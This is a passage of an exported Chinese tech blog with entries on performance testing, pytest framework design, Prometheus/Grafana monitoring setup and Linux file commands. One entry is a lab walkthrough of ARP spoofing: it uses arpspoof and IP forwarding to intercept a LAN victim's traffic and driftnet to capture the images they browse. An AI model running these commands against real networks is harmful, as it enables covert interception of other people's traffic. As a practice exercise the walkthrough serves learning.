href="https://blog.csdn.net/songyun333/article/details/122983933?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-122983933-blog-106380009.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-122983933-blog-106380009.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">tps:&#x2F;&#x2F;blog.csdn.net&#x2F;songyun333&#x2F;article&#x2F;details&#x2F;122983933?spm&#x3D;1001.2101.3001.6650.2&amp;utm_medium&#x3D;distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122983933-blog-106380009.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source&#x3D;distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122983933-blog-106380009.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index&#x3D;2</a><br />3、<a href="https://juejin.cn/post/6960902756412424199">https://juejin.cn/post/6960902756412424199</a><br />4、<a href="https://blog.csdn.net/SKY_PLA/article/details/120828542?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-120828542-blog-122762993.pc_relevant_recovery_v2&spm=1001.2101.3001.4242.1&utm_relevant_index=2">https://blog.csdn.net/SKY_PLA&#x2F;article&#x2F;details&#x2F;120828542?utm_medium&#x3D;distribute.pc_relevant.none-task-blog-2<del>default</del>baidujs_baidulandingword~default-0-120828542-blog-122762993.pc_relevant_recovery_v2&amp;spm&#x3D;1001.2101.3001.4242.1&amp;utm_relevant_index&#x3D;2</a></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>小练习-利用arp欺骗获取目标机浏览图片</title>
    <url>/2023/05/04/%E5%B0%8F%E7%BB%83%E4%B9%A0-%E5%88%A9%E7%94%A8arp%E6%AC%BA%E9%AA%97%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p><a name="r0Zwd"></a></p>
<h1 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h1><p><a name="MZAfE"></a></p>
<h4 id="A、操作系统："><a href="#A、操作系统：" class="headerlink" title="A、操作系统："></a>A、操作系统：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标机-centos  192.168.1.33  网关 192.168.1.3</span><br><span class="line">攻击方-kali    192.168.1.114</span><br><span class="line"></span><br><span class="line">要求：</span><br><span class="line">1、目标机与攻击机处于同一个局域网</span><br><span class="line">2、攻击方需知道目标机的ip和目标机的网关</span><br></pre></td></tr></table></figure>
<p><a name="NNw9c"></a></p>
<h4 id="B、kali所需工具："><a href="#B、kali所需工具：" class="headerlink" title="B、kali所需工具："></a>B、kali所需工具：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、arpspoof（使用apt install dsniff安装，如果出现未找到软件包之类的，多换几个国内源，再更新下）</span><br><span class="line">2、 driftnet：是一款网络流量捕捉图像并将其显示在小窗口的软件</span><br><span class="line">主要参数：</span><br><span class="line">    -b    捕获到新的图片时发声</span><br><span class="line">    -d    指定保存图片的路径</span><br><span class="line">    -x    指定保存图片的前缀名</span><br><span class="line">    -i    选择监听接口</span><br><span class="line">    -f    读取一个指定pcap数据包中的图片</span><br><span class="line">    -a    后台模式：</span><br><span class="line">    -m    指定保存图片数的数目</span><br></pre></td></tr></table></figure>

<p>二、实操阶段<br />1、kali配置网络<br />将kali的ip设置到与目标机的ip同网段<br />2、相互ping ，查看是否可连通</p>
<p>3、开始arp攻击：将目标机的网关地址替换成攻击方的ip地址，这样目标机的流量就会从转发到攻击方的机器<br>未开始前查看原始数据未开始前用fping看看同一网段下还存在什么ip,再用arp -a看看目标机的原始arp缓存是什么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看局域网内存在的主机</span><br><span class="line">fping -g 192.168.1.1/24</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682588958883-433d250d-3008-47e3-958b-3c927d0165a3.png#averageHue=%23272d3d&clientId=u5017a552-0a73-4&from=paste&height=194&id=u0e5d0114&originHeight=194&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50246&status=done&style=none&taskId=u0c46188f-94dd-4517-b7c8-7e4b78cdce4&title=&width=627" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589324113-13ec8f8e-ea61-4d06-827a-b5e7d043a255.png#averageHue=%23320c27&clientId=u5017a552-0a73-4&from=paste&height=273&id=u386cf0df&originHeight=273&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91844&status=done&style=none&taskId=u3b6af19c-d8a8-4bb3-af47-d2c0c86970e&title=&width=553" alt="image.png"></p>
<p>开始用arpspoof工具进行arp攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开启路由转发，实验结束后关闭即可，这个不开的话受害主机就断网了</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward   </span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.33 192.168.1.3</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">-i后面的参数是网卡名称</span><br><span class="line">-t后面的参数是目的主机和网关，要截获目的主机发往网关的数据包</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589758417-9a15a4ab-7d30-4080-8d72-7b04ed676bb9.png#averageHue=%23272d3c&clientId=u5017a552-0a73-4&from=paste&height=246&id=u1f74a382&originHeight=246&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72089&status=done&style=none&taskId=u29a8704b-a6ad-4d09-aae9-e453f4ecb61&title=&width=647" alt="image.png"><br />不终止程序，来到目标机查看arp缓存 <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589968057-85f3e6a7-2593-4409-98f0-a3c1d7b09147.png#averageHue=%23330d27&clientId=u5017a552-0a73-4&from=paste&height=143&id=u22d3c497&originHeight=143&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59771&status=done&style=none&taskId=ud2c7f962-6cbb-4e9b-a988-f1b3febfc3b&title=&width=534" alt="image.png"><br />4、使用driftnet查看<br />此时，在目标机内查看图片（只能查看http的，https无法获取），攻击方在driftnet内就能看到图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682590495272-5a23672a-71ef-4756-920b-6bceffc61e68.png#averageHue=%2394744e&clientId=u5017a552-0a73-4&from=paste&height=866&id=u0fb8b485&originHeight=866&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1470505&status=done&style=none&taskId=uecb3de18-d2b2-40e4-bafa-25a883d9f90&title=&width=1596" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683102987062-43478815-bedc-4fad-b30b-b5d5b89c6eca.png#averageHue=%232a2f3d&clientId=u925194d7-4358-4&from=paste&height=878&id=u31f37fc2&originHeight=878&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191263&status=done&style=none&taskId=u3510c0c6-a88b-40ad-ae24-1ecba883644&title=&width=1668" alt="image.png"><br />总结：图片抓取不是很准确，有的能抓，有的不能，有时可抓，有时又不可抓。。。。。抓的不全<br />而且这个图片界面也没有滚动条</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>自动化测试框架设计</title>
    <url>/2023/11/28/%E5%8A%9F%E8%83%BD%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p><a name="E86rq"></a></p>
<h1 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h1><p><img src="/images/1663914169708-974e732f-6247-4ab2-af99-83c1f73e4b77.png" alt="1663914169708-974e732f-6247-4ab2-af99-83c1f73e4b77"></p>
<h1 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h1><p><img src="/images/1675064971231-6f4bf69f-b651-45ba-8463-5dc170e043d9.jpeg" alt="1675064971231-6f4bf69f-b651-45ba-8463-5dc170e043d9"></p>
<p><a name="lT7T2"></a></p>
<h1 id="数据依赖"><a href="#数据依赖" class="headerlink" title="数据依赖"></a>数据依赖</h1><p><strong>pytest-dependency</strong><br />用例前使用@pytest.mark.dependency()</p>
<p><a name="KQcMO"></a></p>
<h1 id="断言设计"><a href="#断言设计" class="headerlink" title="断言设计"></a>断言设计</h1><p><a name="y7FSG"></a></p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p><img src="/images/1701337794483-7961edc8-8b8c-44db-8af0-7cad4d0fb5b5.jpeg" alt="1701337794483-7961edc8-8b8c-44db-8af0-7cad4d0fb5b5"><br><a name="TzgJE"></a></p>
<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><a name="WKQUy"></a></p>
<h3 id="sql断言"><a href="#sql断言" class="headerlink" title="sql断言"></a>sql断言</h3><p>基本功能：断言类型使用sql_check，预期结果使用正则表达式，提取响应结果的数据；再将响应结果提取的数据与数据库结果对比<br /><img src="/images/1701417451676-fcdd7913-b2ab-48fa-b062-8a4e34713710.jpeg"><br />一个功能是否正常需要多个接口执行<br />拿上游用例数据？</p>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>pytest</tag>
      </tags>
  </entry>
  <entry>
    <title>性能监控工具：prometheus+grafana</title>
    <url>/2023/07/17/%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%EF%BC%9Aprometheus+grafana/</url>
    <content><![CDATA[<p><a name="x4MKx"></a></p>
<h1 id="一、exporter、prometheus和grafana"><a href="#一、exporter、prometheus和grafana" class="headerlink" title="一、exporter、prometheus和grafana"></a>一、exporter、prometheus和grafana</h1><p><a href="https://www.prometheus.wang/exporter/what-is-prometheus-exporter.html">Exporter是什么 · Prometheus中文技术文档</a></p>
<blockquote>
<p>广义上讲所有可以向Prometheus<strong>提供监控样本数据</strong>的程序都可以被称为一个Exporter。而Exporter的一个实例称为target，如下所示，Prometheus通过轮询的方式定期从这些target中获取样本数据:</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1689237114049-24224af4-e47c-4b94-a973-0b0f8ea7806d.png#averageHue=%23faf9f8&clientId=uede48196-0018-4&from=paste&id=u883504ef&originHeight=254&originWidth=1018&originalType=url&ratio=1&rotation=0&showTitle=false&size=21894&status=done&style=none&taskId=u12aed51a-b12e-41d3-8795-0a337fed4d6&title=" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/25987745/1689237225362-f7e1cfd4-61d8-4515-abb5-3971a85f6278.jpeg"><br />总的来说，就是每台需要被监控的服务器都要先安装exporter，exporter会一直监听服务器的各个服务，然后将这些数据(内存、cpu、磁盘等)发送给prometheus，那么prometheus就可以实时监控这些服务器的状态；<br />而grafana连接prometheus，可以把prometheus的数据同步过来，因为grafana有许多模块，所以能够更加直观地展示这些指标<br><a name="kZtDR"></a></p>
<h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h1><p>准备工作：</p>
<ul>
<li>本次搭建为方便仅用一台机器，所以服务端和客户端都是一个IP：192.168.131.129  	ubuntu-22.04.2<br><a name="NQj36"></a></li>
</ul>
<h2 id="被监测端（客户端）"><a href="#被监测端（客户端）" class="headerlink" title="被监测端（客户端）"></a>被监测端（客户端）</h2><ul>
<li>在所有需要监测的服务器上安装node_exporter<br><a name="DuLva"></a></li>
</ul>
<h3 id="安装exporter"><a href="#安装exporter" class="headerlink" title="安装exporter"></a>安装exporter</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载</span></span><br><span class="line">wget https://github.com/prometheus/node_exporter/releases/download/v1.3.1/node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重命名</span></span><br><span class="line">mv node_exporter-1.3.1.linux-amd64 node_exporter</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="SfKTr"></a></p>
<h3 id="启动node-exporter"><a href="#启动node-exporter" class="headerlink" title="启动node_exporter"></a>启动node_exporter</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./node_exporter </span><br></pre></td></tr></table></figure>
<p>启动后，默认监听端口为9100，在浏览器输入，192.168.152.101:9100可以查看访问 Client 的监控指标；进入metrics可以看到相关信息<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1689238122187-6a7d92dc-ce8c-4cdc-a5c5-107672291b2e.png#averageHue=%23efedeb&clientId=uede48196-0018-4&from=paste&height=675&id=ua9e0f0dd&originHeight=675&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&size=330305&status=done&style=none&taskId=ua23781b4-d91b-43f2-b661-1d2de7f8dff&title=&width=901" alt="image.png"><br><a name="ikhYS"></a></p>
<h2 id="查看端（服务器）"><a href="#查看端（服务器）" class="headerlink" title="查看端（服务器）"></a>查看端（服务器）</h2><p><a name="Hj8VV"></a></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>服务端下载prometheus：<a href="https://github.com/prometheus/prometheus/releases">https://github.com/prometheus/prometheus/releases</a><br />找到自己的linux版本，大多数是linux-amd64<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1689238500694-fcf5fc70-5d14-41c4-a86b-9051a7955612.png#averageHue=%23fefefd&clientId=uede48196-0018-4&from=paste&height=465&id=u03e7209b&originHeight=465&originWidth=507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76111&status=done&style=none&taskId=u4fb136b3-212c-467c-a68f-a33822ad777&title=&width=507" alt="image.png"><br />下载完只关注两个文件</p>
<ul>
<li>启动文件：prometheus</li>
<li>配置文件：prometheus.yml<br><a name="dSeEM"></a></li>
</ul>
<h3 id="服务端与客户端连接"><a href="#服务端与客户端连接" class="headerlink" title="服务端与客户端连接"></a>服务端与客户端连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat prometheus.yml</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">my global config</span></span><br><span class="line">global:</span><br><span class="line">  scrape_interval:     15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.</span><br><span class="line">  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">scrape_timeout is <span class="built_in">set</span> to the global default (10s).</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Alertmanager configuration</span></span><br><span class="line">alerting:</span><br><span class="line">  alertmanagers:</span><br><span class="line">  - static_configs:</span><br><span class="line">    - targets:</span><br><span class="line">      # - alertmanager:9093</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Load rules once and periodically evaluate them according to the global <span class="string">&#x27;evaluation_interval&#x27;</span>.</span></span><br><span class="line">rule_files:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">- <span class="string">&quot;first_rules.yml&quot;</span></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">- <span class="string">&quot;second_rules.yml&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">A scrape configuration containing exactly one endpoint to scrape:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Here it<span class="string">&#x27;s Prometheus itself.</span></span></span><br><span class="line">scrape_configs:</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"><span class="string">The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config.</span></span></span><br><span class="line">  - job_name: &#x27;prometheus&#x27;</span><br><span class="line"></span><br><span class="line">    # metrics_path defaults to &#x27;/metrics&#x27;</span><br><span class="line">    # scheme defaults to &#x27;http&#x27;.</span><br><span class="line"></span><br><span class="line">    static_configs:</span><br><span class="line">    - targets: [&#x27;localhost:9090&#x27;]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">------在这里 新增如下内容，job_name可以随便命名，targets是刚刚客户端的IP和端口</span></span></span><br><span class="line">  - job_name: &#x27;server&#x27;</span><br><span class="line">    static_configs:</span><br><span class="line">      - targets:  [&#x27;localhost:9100&#x27;]</span><br></pre></td></tr></table></figure>
<p><a name="ajvlD"></a></p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./prometheus --config.file=prometheus.yml</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时登陆9090端口可以测试看看，进入status&gt;&gt;targets<br><a name="pPnQ2"></a></p>
<h2 id="第三方界面安装–grafana"><a href="#第三方界面安装–grafana" class="headerlink" title="第三方界面安装–grafana"></a>第三方界面安装–grafana</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -</span><br><span class="line">echo &quot;deb https://packages.grafana.com/enterprise/deb stable main&quot; | sudo tee -a /etc/apt/sources.list.d/grafana.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install grafana-enterprise</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">sudo systemctl start grafana-server.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>s访问Grafana，登录<a href="http://192.168.152.103:3000/%EF%BC%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9Aadmin%EF%BC%8Cadmin">http://192.168.152.103:3000/，默认账号密码：admin，admin</a><br />添加数据 add data source<br />。。。。。<br />后面添加数据源和模板即可，懒得写了，网上找<br><a name="R37vk"></a></p>
<h2 id="后台启动"><a href="#后台启动" class="headerlink" title="后台启动"></a>后台启动</h2><p>服务端：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不保存日志</span></span><br><span class="line">nohup ./prometheus --config.file=prometheus.yml &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">保存日志到/var/log/prometheus.log</span></span><br><span class="line">nohup ./prometheus --config.file=prometheus.yml &gt;/var/log/prometheus.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>客户端：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不保存日志</span></span><br><span class="line">nohup ./node_exporter &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">保存日志到/var/log/node_exporter.log</span></span><br><span class="line">nohup ./node_exporter &gt;/var/log/node_exporter.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="qYleR"></a></p>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>1、：如果出现fail开头的问题，直接重新安装一个更高grafana版本即可</p>
<p>参考：<a href="https://huaweicloud.csdn.net/6356391fd3efff3090b5b217.html?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~activity-2-125845193-blog-114697770.235%5Ev38%5Epc_relevant_anti_t3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~activity-2-125845193-blog-114697770.235%5Ev38%5Epc_relevant_anti_t3&utm_relevant_index=5">普罗米修斯Prometheus+Grafana，监控搭建与界面基础配置_linux_the丶only-华为云开发者联盟</a></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-文件夹/文件操作</title>
    <url>/2022/01/03/%E6%96%87%E4%BB%B6%E5%A4%B9_%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p><strong>mkdir [文件夹]:创建文件</strong><br /><strong>mkdir [文件夹] -p:若上级目录不存在，自动创建上级目录</strong><br />例：mkdir a b 在当前目录创建多个文件夹<br />mkdir .a 在当前目录创建隐藏的文件夹<br /><strong>touch [文件]:新建文件</strong><br />例：touch a b 创建多个文件<br />touch .a创建隐藏文件<br /><strong>cp [文件]：拷贝文件 另命名文件名</strong><br />例： cp test.txt &#x2F;root&#x2F;test&#x2F;test01&#x2F;testcp.txt 将test.txt复制到&#x2F;root&#x2F;test&#x2F;test01目录下，命名为testcp.txt<br /><strong>mv [文件路径] [新路径]:移动文件</strong><br /><strong>rm [文件]:删除文件</strong><br /><strong>rm -r [文件&#x2F;文件夹]:删除文件&#x2F;文件夹(提示确认删除)</strong><br /><strong>rm -rf [文件&#x2F;文件夹]:强制删除文件&#x2F;文件夹（不提示）</strong><br /><strong>管道：|  （这个不是字母）–&gt;一个命令的输出可以通过管道做为另一个命令的输入</strong></p>
<p><strong>find [文件&#x2F;文件夹]：查找文件———只能在某一目录下查找文件&#x2F;文件夹</strong><br /><strong>查找名称可以全局查找（精确查询）</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646743410099-a385f56c-a2f2-4081-adef-10d64835ade1.png#averageHue=%23fdf4f3&clientId=u9c864715-faf9-4&from=paste&height=292&id=u0b874314&originHeight=338&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32835&status=done&style=none&taskId=u37022825-cbad-48ea-bf4c-1607493b43d&title=&width=491" alt="image.png"></p>
<p>find [path] [option] [action]<br />[option]:（只列几个常用）<br><a name="nFvxa"></a></p>
<h4 id="1、与时间有关的参数-atime-ctime-mtime"><a href="#1、与时间有关的参数-atime-ctime-mtime" class="headerlink" title="1、与时间有关的参数-atime -ctime -mtime"></a>1、与时间有关的参数-atime -ctime -mtime</h4><p>-atime n:过去n天内被<strong>读取</strong>过的文件<br />-ctime -n +n: #按文件创建时间来查找文件，-n指n天以内，+n指n天以前 <br />-mtime -n +n: #按文件更改时间来查找文件，-n指n天以内，+n指n天以前<br />-newer file: file作为一个已存在的文件，列出比file更加新的文件名<br />例：find &#x2F; -mtime 0  —–&gt; 0代表当前时间，即从现在开始到24小时前被改动的所有文件<br />find &#x2F; -mtime 3 ——&gt;从3天前的24小时内</p>
<p><a name="wc0kL"></a></p>
<h4 id="2、与用户或用户组名有关的参数"><a href="#2、与用户或用户组名有关的参数" class="headerlink" title="2、与用户或用户组名有关的参数"></a>2、与用户或用户组名有关的参数</h4><p>-uid n:   n为数字，是用户的账号ID，即UID，这个UID记录在&#x2F;etc&#x2F;passwd里与账号名称对应的数字<br />——太多了吧</p>
<p><a name="N4DWc"></a></p>
<h4 id="3、与文件权限及名称有关的参数"><a href="#3、与文件权限及名称有关的参数" class="headerlink" title="3、与文件权限及名称有关的参数"></a>3、与文件权限及名称有关的参数</h4><p><a name="GYmpi"></a></p>
<h4 id="4、其他可进行的操作"><a href="#4、其他可进行的操作" class="headerlink" title="4、其他可进行的操作"></a>4、其他可进行的操作</h4>]]></content>
      <categories>
        <category>软件测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-查看文件</title>
    <url>/2023/03/24/%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p><strong>cat:由第一行开始显示文件的全部内容（直接显示，不可分页，适用于查看内容少的文件）。</strong><br /><strong>tac:从最后一行开始显示，是cat的倒写形式。</strong><br /><strong>nl:显示时输出行号</strong><br /><strong>more:一页页地显示打印在终端，（b显示上一页，空格显示下一页），翻到最后一页直接跳出文件</strong><br /><strong>less:与more类似，但不打印在终端，支持翻页,适用内容多的文件</strong><br /><strong>head:只看头几行</strong><br /><strong>tail:只看末尾几行</strong><br /><strong>od:以二进制的方式读取文件内容</strong></p>
<p><a name="TV4xD"></a></p>
<h3 id="1、直接查看文件内容cat、tac、nl"><a href="#1、直接查看文件内容cat、tac、nl" class="headerlink" title="1、直接查看文件内容cat、tac、nl"></a>1、直接查看文件内容cat、tac、nl</h3><p><strong>cat [参数] [文件]</strong><br />参数：</p>
<table>
<thead>
<tr>
<th>-b</th>
<th>忽略空白行显示行号</th>
</tr>
</thead>
<tbody><tr>
<td>-n</td>
<td>空白行也显示行号</td>
</tr>
</tbody></table>
<p><strong>tac [参数] [文件] 从后往前依次打印</strong><br /><strong>nl [参数] [文件] 添加行号显示</strong><br />参数：</p>
<table>
<thead>
<tr>
<th>-b<br />(指定行号是否要忽略空白行)</th>
<th>a</th>
<th>空白行也显示行号（类似cat -n）</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>t</td>
<td>空白行不显示行号，即跳过空白行继续往下计行数（默认值）</td>
</tr>
<tr>
<td>-n<br />(列出行号表示 的方法)</td>
<td>ln</td>
<td>行号显示在最左方</td>
</tr>
<tr>
<td></td>
<td>rn</td>
<td>行号在自己字段的最右方显示，且不加0</td>
</tr>
<tr>
<td></td>
<td>rz</td>
<td>行号在自己字段的最右方显示，且加0</td>
</tr>
</tbody></table>
<p><a name="WATZL"></a></p>
<h2 id="2、可翻页查看more、less"><a href="#2、可翻页查看more、less" class="headerlink" title="2、可翻页查看more、less"></a>2、可翻页查看more、less</h2><p><strong>more</strong>:一页一页地翻动，<br />运行过程中的操作：<br />空格键：下一页<br /><strong>b</strong>:上一页，对文件有用，对管道无用<br /><strong>Enter</strong>：向下滚动一行<br /><strong>&#x2F;字符串</strong>：<strong>向下</strong>查询“字符串”这个关键字<br /><strong>:f</strong>：显示出文件名及目前显示的行数<br />q:退出</p>
<p><strong>less:less用用法比more更加弹性，拥有的查询功能更多；可向上查询，向下查询</strong><br /><strong>操作：</strong><br /><strong>空格键     ：下一页</strong><br /><strong>b 	        ：上一页</strong><br /><strong>&#x2F;字符串   ：向下查询“字符串”</strong><br /><strong>？字符串 ：向上查询“字符串”</strong><br /><strong>n		:重复前一个查询（与&#x2F;或？有关）</strong><br /><strong>N  		:反向重复前一个查询（与&#x2F;或？有关）</strong><br /><strong>q		:退出</strong><br><a name="DLXmM"></a></p>
<h2 id="3、数据选取head、tail"><a href="#3、数据选取head、tail" class="headerlink" title="3、数据选取head、tail"></a>3、数据选取head、tail</h2><p>head和tail都是以“行”为单位进行数据选取的<br /><strong>head [参数] [文件]：查看文件头几行的内容，默认查看前10行</strong><br />参数：**-n &lt;数字&gt;**</p>
<p><strong>tail [参数] [文件]<strong>：查看文件后面几行的内容，默认查看文件后10行的内容<br />参数：<br /></strong>    -n &lt;数字&gt;</strong> ，代表显示几行<br />   ** -f** 表示持续检测文件，按下Ctrl+c结束读取（我的是**-F**才能实时刷新，centos7）<br />   ** -c &lt;数字&gt;**，表示显示的字节数<br />    -q 不显示处理信息<br />    -v 显示详细的处理信息<br />    –pid&#x3D;PID 与-f合用,表示在进程ID,PID死掉之后结束<br />    -q, –quiet, –silent 从不输出给出文件名的首部<br />    -s, –sleep-interval&#x3D;S 与-f合用,表示在每次反复的间隔休眠S秒<br><a name="nnPqu"></a></p>
<h2 id="4、非纯文本文件：od"><a href="#4、非纯文本文件：od" class="headerlink" title="4、非纯文本文件：od"></a>4、非纯文本文件：od</h2><p>od [-t 类型]  [文件]<br />类型：<br />a:<br />c:<br />d[size]:利用十进制(decimal)输出数据，每个整数占用size bytes;<br />f[size]:利用浮点数(decimal)输出数据，每个整数占用size bytes;<br />o[size]:利用八进制(decimal)输出数据，每个整数占用size bytes;<br />x[size]:利用十六进制(decimal)输出数据，每个整数占用size bytes;</p>
<p>实操：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646654882082-00f07ff0-464b-4ee4-8e55-b0c25ec3aaa0.png#averageHue=%23f8f4f4&clientId=u581b7dae-b671-4&from=paste&height=431&id=ue8d693f0&originHeight=656&originWidth=606&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71448&status=done&style=none&taskId=u51ffe886-0b88-4f1d-b0db-dd4b72efe50&title=&width=398" alt="image.png"></p>
